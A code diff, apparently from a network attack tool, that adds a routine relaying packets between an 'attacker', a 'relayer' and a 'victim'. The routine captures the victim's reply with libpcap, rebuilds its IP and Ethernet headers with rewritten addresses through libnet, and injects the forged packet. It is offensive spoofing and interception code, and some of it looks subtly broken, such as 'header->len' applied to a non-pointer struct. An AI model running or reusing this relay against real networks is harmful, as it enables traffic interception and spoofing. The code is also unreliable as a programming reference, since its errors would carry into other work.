@@ -105,6 +105,7 @@ void relay_IP(const struct sniff_ethernet *ethernet, const struct sniff_ip *ip, 
     		fprintf(stderr, "Error writing packet: %s\n", libnet_geterror(ln_context));
 	
 	// Receive response from attacker to relayer
+	printf("Receiving response from attacker to relayer\n");
 	/* Find the properties for the device */
 	bpf_u_int32 mask;		/* Our netmask */
 	bpf_u_int32 net;		/* Our IP */
@@ -150,6 +151,55 @@ void relay_IP(const struct sniff_ethernet *ethernet, const struct sniff_ip *ip, 
 	const u_char *packet;		/* The actual packet */
 	packet = pcap_next(handle, &header);
 	// Send response from victim to attacker
+	printf("Sending response from victim to attacker\n");
+	const struct sniff_ethernet *new_ethernet; /* The ethernet header */
+	const struct sniff_ip *new_ip; /* The IP header */
+	const struct sniff_tcp *new_tcp; /* The TCP header */
+	const u_char *new_payload; /* Packet payload */
+
+	u_int size_ip;
+	u_int size_tcp;	
+	new_ethernet = (struct sniff_ethernet*)(packet);
+	new_ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
+	size_ip = IP_HL(new_ip)*4;
+	if (size_ip < 20) {
+		printf("   * Invalid IP header length: %u bytes\n", size_ip);
+		return;
+	}
+	new_tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);
+	size_tcp = TH_OFF(new_tcp)*4;
+	if (size_tcp < 20) {
+		printf("   * Invalid TCP header length: %u bytes\n", size_tcp);
+		return;
+	}
+	const u_char *new_ip_payload = (u_char *)(packet + SIZE_ETHERNET + size_ip);
+	u_int32_t new_ip_payload_s = header->len - (SIZE_ETHERNET + size_ip);
+	// Construct IP header
+	if (libnet_build_ipv4 (new_ip->ip_len,
+    		new_ip->ip_tos, new_ip->ip_id, new_ip->ip_off,
+    		new_ip->ip_ttl, new_ip->ip_p, new_ip->ip_sum,
+    		v_ip, new_ip->ip_src.s_addr, new_ip_payload,
+    		new_ip_payload_s, ln_context, 0) == -1 )
+  	{
+    		fprintf(stderr, "Error building IP header: %s\n",\
+        	libnet_geterror(ln_context));
+    		libnet_destroy(ln_context);
+    		exit(0);
+  	}
+	// Construct Ethernet header
+	if ( libnet_build_ethernet(new_ethernet->ether_shost, v_mac, new_ethernet->ether_type, 
+		NULL, 0, ln_context, 0) == -1 )
+  	{
+    		fprintf(stderr, "Error building Ethernet header: %s\n",\
+        	libnet_geterror(ln_context));
+    		libnet_destroy(ln_context);
+    		exit(0);
+  	}
+	int bytes_written = libnet_write(ln_context);
+	if ( bytes_written != -1 )
+    		printf("%d bytes written.\n", bytes_written);
+  	else
+    		fprintf(stderr, "Error writing packet: %s\n", libnet_geterror(ln_context));
 	
 }
 
